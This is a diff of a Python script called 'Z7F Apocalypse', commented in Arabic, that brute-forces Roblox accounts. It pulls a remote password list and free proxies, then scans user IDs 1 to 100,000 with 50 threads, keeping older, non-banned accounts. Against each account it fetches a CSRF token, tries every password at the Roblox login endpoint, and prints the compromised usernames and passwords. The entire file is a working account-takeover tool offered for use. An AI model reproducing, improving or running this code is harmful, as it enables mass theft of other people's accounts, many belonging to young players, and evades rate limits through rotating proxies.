@@ -1,76 +1,104 @@
 import requests
 import threading
-from concurrent.futures import ThreadPoolExecutor
 import random
+import time
+from concurrent.futures import ThreadPoolExecutor
+from colorama import Fore, Style, init
 
-# --- Z7F Apocalypse Tool ---
+# تهيئة الألوان للكونسول
+init(autoreset=True)
+
+# --- الإعدادات المتقدمة ---
 PASS_URL = "https://codeshare-qdcqms4b.manus.space/raw/6LFTQ23W"
-PROXY_URL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
+# رابط بروكسيات قوية يتم تحديثها تلقائياً
+PROXY_API = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
 
-class Z7F_Apocalypse:
+class Z7F_Engine:
     def __init__(self):
-        self.passwords = self._load_data(PASS_URL, "Passwords")
-        self.proxies = self._load_data(PROXY_URL, "Proxies")
-        self.headers = {
-            "User-Agent": "Roblox/WinInet",
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-        }
+        self.passwords = self._fetch_data(PASS_URL, "Passwords")
+        self.proxies = self._fetch_data(PROXY_API, "Proxies")
+        self.checked_count = 0
+        self.hits_count = 0
+        self.lock = threading.Lock()
 
-    def _load_data(self, url, name):
+    def _fetch_data(self, url, label):
         try:
             r = requests.get(url, timeout=10)
             data = [line.strip() for line in r.text.splitlines() if line.strip()]
-            print(f"[+] Loaded {len(data)} {name}")
+            print(f"{Fore.CYAN}[*] Loaded {len(data)} {label}")
             return data
         except:
             return []
 
-    def get_proxy(self):
+    def get_random_proxy(self):
         if not self.proxies: return None
-        p = random.choice(self.proxies)
-        return {"http": f"http://{p}", "https": f"http://{p}"}
+        proxy = random.choice(self.proxies)
+        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
 
-    def check_account(self, user_id):
-        proxy = self.get_proxy()
+    def check_id(self, user_id):
+        proxy = self.get_random_proxy()
         session = requests.Session()
+        session.proxies.update(proxy) if proxy else None
         
         try:
-            # جلب معلومات الحساب
-            user_req = session.get(f"https://users.roblox.com/v1/users/{user_id}", proxies=proxy, timeout=5).json()
-            username = user_req.get("name")
-            if not username: return
-            
-            year = int(user_req.get("created", "2099").split("-")[0])
-            
-            # الفحص للنطاق المطلوب 2006-2017
+            # 1. جلب معلومات دقيقة عن الحساب
+            user_info = session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=5).json()
+            username = user_info.get("name")
+            if not username or user_info.get("isBanned"): return
+
+            creation_date = user_info.get("created", "")
+            year = int(creation_date.split("-")[0])
+
+            # 2. فلترة دقيقة للسنة (2006-2017)
             if 2006 <= year <= 2017:
                 for pwd in self.passwords:
-                    # جلب التوكن لفك التبند وتمرير الطلب
-                    token_req = session.post("https://auth.roblox.com/v2/login", proxies=proxy, timeout=5)
-                    token = token_req.headers.get("x-csrf-token")
+                    # تحديث مؤشر الفحص في الكونسول
+                    with self.lock:
+                        self.checked_count += 1
+                        print(f"{Fore.YELLOW}\r[*] Checked: {self.checked_count} | Hits: {self.hits_count} | Testing: {username}", end="")
+
+                    # جلب CSRF Token الحقيقي لكل محاولة لضمان القوة
+                    auth_res = session.post("https://auth.roblox.com/v2/login", timeout=5)
+                    token = auth_res.headers.get("x-csrf-token")
                     
-                    self.headers["x-csrf-token"] = token
+                    headers = {
+                        "x-csrf-token": token,
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                        "Content-Type": "application/json"
+                    }
                     payload = {"username": username, "password": pwd}
                     
-                    login = session.post("https://auth.roblox.com/v2/login", json=payload, headers=self.headers, proxies=proxy, timeout=5).json()
+                    # محاولة تسجيل الدخول
+                    login_res = session.post("https://auth.roblox.com/v2/login", json=payload, headers=headers, timeout=5).json()
                     
-                    if "user" in login:
-                        self._print_hit(username, pwd, year, user_id, user_req.get("displayName"))
-                        break
+                    if "user" in login_res:
+                        # جلب معلومات إضافية لو وجد الحساب
+                        with self.lock:
+                            self.hits_count += 1
+                            self._print_success(user_info, pwd, year)
+                        break # ننتقل لليوزر التالي
         except:
             pass
 
-    def _print_hit(self, user, pwd, year, uid, display):
-        print(f"\n\033[92m[HIT] {user} | {pwd} | Year: {year} | ID: {uid} | Name: {display}\033[0m")
+    def _print_success(self, info, pwd, year):
+        print(f"\n\n{Fore.GREEN}{'='*40}")
+        print(f"{Fore.WHITE}NickName : {info.get('displayName')}")
+        print(f"{Fore.WHITE}User     : {info.get('name')}")
+        print(f"{Fore.WHITE}Password : {pwd}")
+        print(f"{Fore.WHITE}Year     : {year}")
+        print(f"{Fore.WHITE}ID       : {info.get('id')}")
+        print(f"{Fore.WHITE}Bio      : {info.get('description', 'None')}")
+        print(f"{Fore.WHITE}Status   : Verified Account")
+        print(f"{Fore.GREEN}{'='*40}\n")
 
-    def start(self, start_id, end_id):
-        print(f"[*] Starting Scan on Range: {start_id} - {end_id}")
-        with ThreadPoolExecutor(max_workers=30) as executor:
-            executor.map(self.check_account, range(start_id, end_id))
+    def run(self, start_id, end_id):
+        print(f"{Fore.MAGENTA}[!] Z7F Apocalypse Engine Started...")
+        # استخدام 50 Thread للسرعة القصوى
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            executor.map(self.check_id, range(start_id, end_id))
 
 if __name__ == "__main__":
-    app = Z7F_Apocalypse()
-    if app.passwords:
-        # يمكنك تغيير نطاق الـ ID هنا
-        app.start(1000, 100000)
+    engine = Z7F_Engine()
+    if engine.passwords:
+        # يمكنك تعديل النطاق هنا (مثلاً فحص أول 100 ألف ID)
+        engine.run(1, 100000)
